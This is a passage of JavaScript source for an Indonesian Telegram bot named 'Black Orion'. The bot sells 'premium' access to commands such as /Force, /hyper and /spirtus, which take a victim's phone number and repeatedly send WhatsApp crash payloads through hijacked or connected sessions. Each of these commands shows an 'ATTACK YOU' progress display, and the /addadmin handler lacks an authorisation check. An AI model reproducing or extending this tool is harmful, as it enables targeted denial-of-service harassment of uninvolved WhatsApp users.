 𖥂 Name : ${username}
 𖥂 ID : ${senderId}
 𖥂 Premium : ${premiumStatus}
 𖥂 Aktip : ${runtime}
<blockquote>╭═───⊱ AKSES MENU ───═⬡</blockquote>
𖥂 /setjeda - 5m
𖥂 /addprem - id
𖥂 /delprem - id
𖥂 /listprem
𖥂 /addadmin - id
𖥂 /deladmin - id
𖥂 /delsesi
𖥂 /restart
𖥂 /addsender - 62×××
<blockquote>CLICK BUTTON DIBAWAH</blockquote>
`;
      replyMarkup = { inline_keyboard: [[{ text: "Back", callback_data: "back_to_main" }]] };
  }
       if (query.data === "tqto") {
      caption = `
<blockquote>𝗕𝗹𝗮𝗰𝗸 ☇ 𝗢𝗿𝗶𝗼𝗻</blockquote>
( 🫀 ) OLAA — ${username} さん、お元気ですか？私は Telegram のボットです。賢く使ってください。無実の人に誤って使わないでください。私のチャンネルで更新情報をお待ちください
<blockquote>╭═───⊱ THANKS TO ───═⬡</blockquote>
𖥂 @RidzzOffc [ DEVELOPER ]
𖥂 MY GOD [ ALLAH ]
𖥂 MY ORTU [ DAD & MOM ]
𖥂 @MarzzOfficial1 [ MY FRIENDS ]
𖥂 @fifganteng [ MY FRIENDS ]
𖥂 @Xatanicvxii [ MY IDOL ]
𖥂 @xwarrxxx [ MY IDOL ]
<blockquote>CLICK BUTTON DIBAWAH</blockquote>
`;
      replyMarkup = { inline_keyboard: [[{ text: "Back", callback_data: "back_to_main" }]] };
  }
          if (query.data === "group") {
      caption = `
<blockquote>𝗕𝗹𝗮𝗰𝗸 ☇ 𝗢𝗿𝗶𝗼𝗻</blockquote>
( 🫀 ) OLAA — ${username} さん、お元気ですか？私は Telegram のボットです。賢く使ってください。無実の人に誤って使わないでください。私のチャンネルで更新情報をお待ちください
<blockquote>╭═───⊱OWNER MENU───═⬡</blockquote>
𖥂 /demote (ʀᴇᴘʟʏ)
𖥂 /promote (ʀᴇᴘʟʏ)
𖥂 /open
𖥂 /close
𖥂 /X (ʀᴇᴘʟʏ)
𖥂 /mute (ʀᴇᴘʟʏ)
𖥂 /unmute (ʀᴇᴘʟʏ)
𖥂 /groupAktip
𖥂 /groupNonaktif
𖥂 /addgroup
𖥂 /delgroup
𖥂 /listgroup
𖥂 /add (@username)
𖥂 /setwelcome (ᴛᴇxᴛ)
𖥂 /setwelcome (ᴛᴇxᴛ)
𖥂 /antilink (ᴏɴ/ᴏғғ)
𖥂 /info
<blockquote>CLICK BUTTON DIBAWAH</blockquote>
`;
      replyMarkup = { inline_keyboard: [[{ text: "Back", callback_data: "back_to_main" }]] };
  }
        if (query.data === "back_to_main") {
  caption = `
<blockquote>𝗕𝗹𝗮𝗰𝗸 ☇ 𝗢𝗿𝗶𝗼𝗻</blockquote>
( 🫀 ) OLAA — ${username} さん、お元気ですか？私は Telegram のボットです。賢く使ってください。無実の人に誤って使わないでください。私のチャンネルで更新情報をお待ちください
<blockquote>╭═───⊱BOT ☇ INFORMATION───═⬡</blockquote>
𖥂 Author : @RidzzOffc
𖥂 BotName : 𝗕𝗹𝗮𝗰𝗸 ☇ 𝗢𝗿𝗶𝗼𝗻
𖥂 Version : 0.0
𖥂 Status : Private
<blockquote>╭═───⊱ YOUR ☇ INFORMATION ───═⬡</blockquote>
𖥂 Name : ${username}
𖥂 ID : ${senderId}
𖥂 Premium : ${premiumStatus}
𖥂 Aktip : ${runtime}
<blockquote>CLICK BUTTON DIBAWAH INI</blockquote>
`;

  replyMarkup = {
    inline_keyboard: [
      [
        { text: "Trash Menu", callback_data: "trashmenu" }
      ],
      [
        { text: "Owner Menu", callback_data: "setting" },
        { text: "TqTo", callback_data: "tqto" },
        { text: "Group Menu", callback_data: "group" }
      ],
      [
        { text: "Channel", url: "https://t.me/ghostStrm" }
      ]
    ]
  };
}

    await bot.editMessageMedia(
      {
        type: "photo", // buat foto kalau mau ubah ke video ganti aja jadi type: "video", hurup jangan kapital
        media: "https://files.catbox.moe/01x5r0.jpg", // sini buat simpan foto ataupun video
        caption: caption,
        parse_mode: "HTML"//gua pakai HTML supaya tampilan bagus di dalam menu nya
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
}),

bot.onText(/\/Force (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry you don't have access to use this command yet..",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Ꝋ所有者", url: "https://t.me/RidzzOffc" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/01x5r0.jpg",
      {
        caption: `
\`\`\`
╭━━『 𝘼𝙏𝙏𝘼𝘾𝙆 𝙔𝙊𝙐 』━━
╭────────────────
│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙿𝚁𝙾𝚂𝙴𝚂 🔃
│𝙿𝚁𝙾𝚂𝙴𝚂 : [□□□□□□□□□□] 0%
╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
        parse_mode: "Markdown",
      }
    );

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■□□□□□□□□□] 10%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■□□□□□□□] 30%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■□□□□□] 50%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■□□□] 70%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■□] 90%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%\n✅ 𝙱𝚄𝙶 𝚂𝚄𝙺𝚂𝙴𝚂🎉", delay: 200 },
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise((resolve) => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
──────────────────────────
 ▢ 𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
 ▢ 𝙸𝙽𝙵𝙾 : Proses Tahap 2 ... 🔃
 ${stage.text}
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    // Eksekusi bug setelah progres selesai
    console.log("PROSES MENGIRIM BUG");
    for (let i = 0; i < 5; i++) {
      await memekfc(sock, jid);
      await memekfc(sock, jid);
    }
    console.log("SUKSES MENGIRIM BUG⚠️");

    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(
      `
\`\`\`
╭━━『 𝘼𝙏𝙏𝘼𝘾𝙆 𝙔𝙊𝙐 』━━
╭────────────────
│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
│𝚃𝙾𝚃𝙰𝙻 𝙱𝙾𝚃 : ${sessions.size}
│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙳𝙾𝙽𝙴 ✅
│𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%
╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝙸𝙽𝙵𝙾 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/hyper (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry you don't have access to use this command yet..",
      parse_mode: "MarkdownV2",
      reply_markup: {
        inline_keyboard: [[{ text: "Ꝋ所有者", url: "https://t.me/RidzzOffc" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/01x5r0.jpg",
      {
        caption: `
\`\`\`
╭━━『 𝘼𝙏𝙏𝘼𝘾𝙆 𝙔𝙊𝙐 』━━
╭────────────────
│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙿𝚁𝙾𝚂𝙴𝚂 🔃
│𝙿𝚁𝙾𝚂𝙴𝚂 : [□□□□□□□□□□] 0%
╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
        parse_mode: "Markdown",
      }
    );

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■□□□□□□□□□] 10%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■□□□□□□□] 30%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■□□□□□] 50%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■□□□] 70%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■□] 90%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%\n✅ 𝙱𝚄𝙶 𝚂𝚄𝙺𝚂𝙴𝚂🎉", delay: 200 },
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise((resolve) => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
──────────────────────────
 ▢ 𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
 ▢ 𝙸𝙽𝙵𝙾 : Proses Tahap 2 ... 🔃
 ${stage.text}
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    // Eksekusi bug setelah progres selesai
    console.log("PROSES MENGIRIM BUG");
    for (let i = 0; i < 5; i++) {
      await FriendMamah(sock, jid);
      await FriendMamah(sock, jid);
    }
    console.log("SUKSES MENGIRIM BUG⚠️");

    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(
      `
\`\`\`
╭━━『 𝘼𝙏𝙏𝘼𝘾𝙆 𝙔𝙊𝙐 』━━
╭────────────────
│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
│𝚃𝙾𝚃𝙰𝙻 𝙱𝙾𝚃 : ${sessions.size}
│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙳𝙾𝙽𝙴 ✅
│𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%
╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝙸𝙽𝙵𝙾 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/victrus (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry you don't have access to use this command yet..",
      parse_mode: "MarkdownV2",
      reply_markup: {
        inline_keyboard: [[{ text: "Ꝋ所有者", url: "https://t.me/RidzzOffc" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/01x5r0.jpg",
      {
        caption: `
\`\`\`
╭━━『 𝘼𝙏𝙏𝘼𝘾𝙆 𝙔𝙊𝙐 』━━
╭────────────────
│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙿𝚁𝙾𝚂𝙴𝚂 🔃
│𝙿𝚁𝙾𝚂𝙴𝚂 : [□□□□□□□□□□] 0%
╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
        parse_mode: "Markdown",
      }
    );

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■□□□□□□□□□] 10%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■□□□□□□□] 30%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■□□□□□] 50%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■□□□] 70%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■□] 90%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%\n✅ 𝙱𝚄𝙶 𝚂𝚄𝙺𝚂𝙴𝚂🎉", delay: 200 },
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise((resolve) => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
──────────────────────────
 ▢ 𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
 ▢ 𝙸𝙽𝙵𝙾 : Proses Tahap 2 ... 🔃
 ${stage.text}
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    // Eksekusi bug setelah progres selesai
    console.log("PROSES MENGIRIM BUG");
    for (let i = 0; i < 2; i++) {
      await ForcloseNoClick(sock, jid);
      await ForcloseNoClick(sock, jid);
    }
    console.log("SUKSES MENGIRIM BUG⚠️");

    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(
      `
\`\`\`
╭━━『 𝘼𝙏𝙏𝘼𝘾𝙆 𝙔𝙊𝙐 』━━
╭────────────────
│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
│𝚃𝙾𝚃𝙰𝙻 𝙱𝙾𝚃 : ${sessions.size}
│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙳𝙾𝙽𝙴 ✅
│𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%
╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝙸𝙽𝙵𝙾 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/spirtus (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry you don't have access to use this command yet..",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Ꝋ所有者", url: "https://t.me/RidzzOffc" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/01x5r0.jpg",
      {
        caption: `
\`\`\`
╭━━『 𝘼𝙏𝙏𝘼𝘾𝙆 𝙔𝙊𝙐 』━━
╭────────────────
│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙿𝚁𝙾𝚂𝙴𝚂 🔃
│𝙿𝚁𝙾𝚂𝙴𝚂 : [□□□□□□□□□□] 0%
╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
        parse_mode: "Markdown",
      }
    );

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■□□□□□□□□□] 10%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■□□□□□□□] 30%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■□□□□□] 50%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■□□□] 70%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■□] 90%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%\n✅ 𝙱𝚄𝙶 𝚂𝚄𝙺𝚂𝙴𝚂🎉", delay: 200 },
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise((resolve) => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
──────────────────────────
 ▢ 𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
 ▢ 𝙸𝙽𝙵𝙾 : Proses Tahap 2 ... 🔃
 ${stage.text}
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    // Eksekusi bug setelah progres selesai
    console.log("PROSES MENGIRIM BUG");
    for (let i = 0; i < 20; i++) {
      await FaiqCrashxForclose(jid);
      await FaiqCrashxForclose(jid);
    }
    console.log("SUKSES MENGIRIM BUG⚠️");

    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(
      `
\`\`\`
╭━━『 𝘼𝙏𝙏𝘼𝘾𝙆 𝙔𝙊𝙐 』━━
╭────────────────
│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
│𝚃𝙾𝚃𝙰𝙻 𝙱𝙾𝚃 : ${sessions.size}
│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙳𝙾𝙽𝙴 ✅
│𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%
╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝙸𝙽𝙵𝙾 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/avail (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry you don't have access to use this command yet..",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Ꝋ所有者", url: "https://t.me/RidzzOffc" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/01x5r0.jpg",
      {
        caption: `
\`\`\`
╭━━『 𝘼𝙏𝙏𝘼𝘾𝙆 𝙔𝙊𝙐 』━━
╭────────────────
│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙿𝚁𝙾𝚂𝙴𝚂 🔃
│𝙿𝚁𝙾𝚂𝙴𝚂 : [□□□□□□□□□□] 0%
╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
        parse_mode: "Markdown",
      }
    );

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■□□□□□□□□□] 10%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■□□□□□□□] 30%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■□□□□□] 50%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■□□□] 70%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■□] 90%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%\n✅ 𝙱𝚄𝙶 𝚂𝚄𝙺𝚂𝙴𝚂🎉", delay: 200 },
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise((resolve) => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
──────────────────────────
 ▢ 𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
 ▢ 𝙸𝙽𝙵𝙾 : Proses Tahap 2 ... 🔃
 ${stage.text}
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    // Eksekusi bug setelah progres selesai
    console.log("PROSES MENGIRIM BUG");
    for (let i = 0; i < 100; i++) {
      await notifandroid(sock, jid);
      await notifandroid(sock, jid);
    }
    console.log("SUKSES MENGIRIM BUG⚠️");

    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(
      `
\`\`\`
╭━━『 𝘼𝙏𝙏𝘼𝘾𝙆 𝙔𝙊𝙐 』━━
╭────────────────
│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
│𝚃𝙾𝚃𝙰𝙻 𝙱𝙾𝚃 : ${sessions.size}
│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙳𝙾𝙽𝙴 ✅
│𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%
╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝙸𝙽𝙵𝙾 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
//===================END CASE SELESEAI===============\\
bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "❌ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "⚡ You are not authorized to add premium users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "⚡ Missing input. Please provide a user ID and duration. Example: /addprem 123456789 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "⚡ Missing input. Please specify a duration. Example: /addprem 123456789 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "⚡ Invalid input. User ID must be a number. Example: /addprem 123456789 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "⚡ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `🔥 User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `🔥 User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "⚡ You are not authorized to view the prem list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - R E G I S T \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "⚡ Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "⚡ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `🔥 User ${userId} has been added as an admin.`);
    } else {
